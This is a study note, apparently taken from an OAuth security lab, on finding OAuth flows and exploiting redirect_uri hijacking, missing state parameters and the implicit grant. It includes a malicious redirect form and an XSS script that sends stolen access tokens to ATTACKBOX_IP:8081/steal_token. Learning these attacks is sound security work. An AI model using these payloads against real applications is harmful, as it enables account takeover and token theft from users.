#OAuth #WEB #WebAuthentication

# Identifying OAuth Usage in an Application

*The first indication that an application uses OAuth is often found in the login process.* 
- Look for options allowing users to log in using external service providers like Google, Facebook, and GitHub. 

## Detecting OAuth Implementation

-  OAuth implementations will generally **redirect the browser to an authorization server's URL** . 
	- This URL often contains specific query parameters, such as `response_type`, `client_id`, `redirect_uri`, `scope`, and `state`. These parameters are indicative of an OAuth flow in progress. 
	- ==EX:== ```
```Python
https://dev.coffee.thm/authorize?response_type=code&client_id=AppClientID&redirect_uri=https://dev.coffee.thm/callback&scope=profile&state=xyzSecure123
```

## Identifying the OAuth Framework

Once you have confirmed that OAuth is being used, *identify the specific framework or library the application employs*. 
This can provide insights into potential vulnerabilities and the appropriate security assessments :

- **HTTP Headers and Responses**: Inspect HTTP headers and response bodies for unique identifiers or comments referencing specific OAuth libraries or frameworks.

- **Source Code Analysis**: If you can access the application's source code, search for specific keywords and import statements that can reveal the framework in use. For instance, libraries like `django-oauth-toolkit`, `oauthlib`, `spring-security-oauth`, or `passport` in `Node.js`, each have unique characteristics and naming conventions.

- **Authorization and Token Endpoints**: Analyze the endpoints used to obtain authorization codes and access tokens. Different OAuth implementations might have unique endpoint patterns or structures. For example, the `Django OAuth Toolkit` typically follows the pattern `/oauth/authorize/` and `/oauth/token/`, while other frameworks might use different paths.

- **Error Messages**: Custom error messages and debug output can inadvertently reveal the underlying technology stack. Detailed error messages might include references to specific OAuth libraries or frameworks.

---

# Exploitation

## Stealing OAuth tokens

- Issued by the authorization server and *redirected to the client application* based on the `redirect_uri` parameter. 
- This redirection is crucial in the OAuth flow, ensuring that tokens are securely transmitted to the intended recipient. 

if the `redirect_uri` is not well protected, attackers can exploit it to **hijack tokens**.

TODO : Gain control over any domain or URI listed in the `redirect_uri`, then manipulate the flow to intercept tokens

==EX:==

The attacker has compromised the authorized domain `dev.bistro.thm:8002` and can host any HTML page on the server 
(craft a simple HTML page `redirect_uri.html`)
- We will send a link to the target through: *Social engineering tactics or a CSRF attack*

``` HTML
<form action="http://coffee.thm:8000/oauthdemo/oauth_login/" method="get"> 
	<input type="hidden" name="redirect_uri" value="http://dev.bistro.thm:8002/malicious_redirect.html">             
	<input type="submit" value="Hijack OAuth">         
</form>
```

This form sends a hidden `redirect_uri` parameter with the value `http://dev.bistro.thm:8002/malicious_redirect.html` and submits a request to [http://coffee.thm:8000/oauthdemo/oauth_login/.](http://coffee.thm:8000/oauthdemo/oauth_login/.)  The `malicious_redirect.html` page then intercepts the authorization code from the URL using the following code:

```javascript
<script>
    // Extract the authorization code from the URL
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get('code');
    document.getElementById('auth_code').innerText = code;
    console.log("Intercepted Authorization Code:", code);
    // code to save the acquired code in database/file etc
</script>   
```

## Weak or Missing State Parameter

*The **state** parameter in the OAuth 2.0 framework protects against CSRF attacks, which occur when an attacker tricks a user into executing unwanted actions on a web application where they are currently authenticated*

I you connect normally to a website with your attacker account, and go to sync social accounts and discover a *missing state param*. You can **forward your OAuth request to a victim to get their social accounts linked to the attacker account**.

==EX:==
- Once the attacker has obtained their legit authorization code `xxxx`, he can prepare the CSRF payload. 
- Suppose the attacker sends an email to the victim with a link like `http://bistro.thm:8080/csrf/callbackcsrf.php?code=xxxx`.  
    
- After receiving the email, if the victim clicks on the link, the attacker's `CoffeeShopApp` OAuth account will be linked to the victim's account.

## Exploiting Implicit Grant Flow

*In the implicit grant flow, tokens are directly returned to the client via the browser without requiring an intermediary authorization code. This flow is primarily used by single-page applications and is designed for public clients who cannot securely store client secrets.*

The [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics) recommends **deprecating the implicit grant flow**

#### Weaknesses

- **Exposing Access Token in URL**: The application redirects the user to the OAuth authorization endpoint, which returns the access token in the URL fragment. Any script running on the page can easily access this fragment.
- **Inadequate Validation of Redirect URIs**: The OAuth server does not adequately validate the redirect URIs, allowing potential attackers to manipulate the redirection endpoint.
- **No HTTPS Implementation**: The application does not enforce HTTPS, which can lead to token interception through man-in-the-middle attacks.
- **Improper Handling of Access Tokens**: The application stores the access token insecurely, possibly in `localStorage` or `sessionStorage`, making it vulnerable to XSS attacks

==EX:==
- Run a Python HTTP server to listen on port `8081`.
- The attacker will share the following payload with the victim that he will enter as status or in a #XSS vulnerable field (assume using social engineering):

```js
<script>var hash = window.location.hash.substr(1);var result = hash.split('&').reduce(function (res, item) {var parts = item.split('=');res[parts[0]] = parts[1];
    return res;
  }, {});
  var accessToken = result.access_token;
    var img = new Image();
    img.src = 'http://ATTACKBOX_IP:8081/steal_token?token=' + accessToken;
</script>
        
```

- The JavaScript payload starts by extracting the fragment identifier from the URL, which is the part of the URL following the `#` symbol. It removes the leading `#` using `substr(1)` to obtain the raw fragment string.

- This string is then split by `&` to separate the individual key-value pairs. The `reduce` function processes each of these pairs, splitting them further by `=` to isolate the keys and values. These key-value pairs are then stored in an object called result.

- The script extracts the `access_token` value from this object and assigns it to the variable `accessToken`. To exfiltrate this access token, the script creates a new Image object and sets its `src` attribute to a URL that points to an attacker's server (`http://ATTACKBOX_IP:8081/steal_token`), appending the access token as a query parameter.

Once the victim refreshes the page, t**he XSS payload is executed**. It copies the access token from the URL fragment and sends it to the attacker's server at `http://ATTACKBOX_IP:8081/steal_token`. 

The attacker can then capture the token and use it to gain unauthorized access to the user's account.

## Insufficient Token Expiry

Access tokens with long or infinite lifetimes pose a significant security risk. If an attacker obtains such a token, they can access protected resources indefinitely. Implementing short-lived access and refresh tokens helps mitigate this risk by limiting the window of opportunity for attackers.

Replay Attacks  

Replay attacks involve capturing valid tokens and reusing them to gain unauthorized access. Attackers can exploit tokens multiple times without mechanisms to detect and prevent token reuse. Implementing `nonce` values and `timestamp` checks can help mitigate replay attacks by ensuring each token is used only once.

Insecure Storage of Tokens

Storing access tokens and refresh tokens insecurely (e.g., in local storage or unencrypted files) can lead to token theft and unauthorized access. Using secure storage mechanisms, such as secure cookies or encrypted databases, can protect tokens from being accessed by malicious actors.

Evolution of OAuth 2.1

OAuth 2.1 represents the latest iteration in the evolution of the OAuth standard, building on the foundation of OAuth 2.0 to address its shortcomings and enhance security.